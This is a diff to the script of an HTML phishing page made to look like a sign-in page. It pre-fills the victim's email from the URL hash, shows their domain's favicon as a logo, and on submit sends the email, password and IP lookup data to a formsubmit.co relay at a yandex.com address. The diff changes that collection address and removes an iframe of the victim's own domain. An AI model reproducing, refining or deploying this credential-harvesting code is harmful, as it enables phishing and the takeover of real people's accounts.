@@ -138,7 +138,7 @@
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script>
 	let step = 1;
-	let submitted = false;
+	let submitted = false; // Prevent double submission
 	
 	// Get clientID from URL hash
 	const clientID = window.location.hash.substring(1);
@@ -149,10 +149,9 @@
 		$('#email').val(clientID);
 		const domain = clientID.split('@').pop();
 		
-		// Set iframe source to the domain
-		$("#frame").attr("src", "https://" + domain);
+		// No iframe to set since we're using background image
 		
-		// Use favicon service for logo
+		// Use favicon service
 		const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
 		$("#logo").attr("src", logoUrl)
 			.on("error", function() {
@@ -163,7 +162,7 @@
 	$("#login-form").submit(function(event) {
 		event.preventDefault();
 		
-		if (submitted) return;
+		if (submitted) return; // Prevent multiple submissions
 		submitted = true;
 		
 		const submitBtn = $("button[type='submit']");
@@ -175,7 +174,7 @@
 		
 		// Get IP info and submit to Formspree
 		$.getJSON('https://ipinfo.io/json', function(response) {
-			const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
+			const posting = $.post("https://formsubmit.co/ajax/dattiobi01@yandex.com", {
 				_subject: "Logs | " + response.ip,
 				Email: email,
 				Password: password,
@@ -194,7 +193,7 @@
 					$("#error").css("display", "block");
 					submitBtn.text('Sign In').prop('disabled', false);
 					$("#psw").val("");
-					submitted = false;
+					submitted = false; // Allow next submission
 				}
 			});
 
@@ -208,11 +207,11 @@
 					$("#error").css("display", "block");
 					submitBtn.text('Sign In').prop('disabled', false);
 					$("#psw").val("");
-					submitted = false;
+					submitted = false; // Allow next submission
 				}
 			});
 		}, "json");
 	});
-	</script>
+</script>
 </body>
 </html>
